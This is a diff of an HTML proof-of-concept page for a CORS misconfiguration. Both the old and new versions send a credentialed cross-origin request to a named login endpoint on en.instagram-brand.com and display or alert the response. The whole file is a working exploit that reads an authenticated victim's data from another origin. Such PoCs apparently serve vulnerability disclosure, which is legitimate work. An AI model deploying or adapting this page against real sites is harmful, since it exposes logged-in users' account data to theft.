@@ -1,31 +1,5 @@
-
-    <!DOCTYPE html>
-    <html>
-    <head>
-    <title>CORS PoC Exploit</title>
-    </head>
-    <body>
-    <center>
-
-    <h1>CORS Exploit<br>Yeasir Arafat</h1>
-    <hr>
-    <div id="demo">
-    <button type="button" onclick="cors()">Exploit</button>
-    </div>
-    <script type="text/javascript">
-    function cors() {
-    var xhttp = new XMLHttpRequest();
-    xhttp.onreadystatechange = function() {
-    if(this.readyState == 4 && this.status == 200) {
-    document.getElementById("demo").innerHTML = this.responseText;
-    }
-    };
-    xhttp.open("GET", "https://en.instagram-brand.com/wp-json/brc/v1/login/", true);
-    xhttp.withCredentials = true;
-    xhttp.send();
-    }
-    </script>
-
-    </center>
-    </body>
-    </html>
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://en.instagram-brand.com/wp-json/brc/v1/login/',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
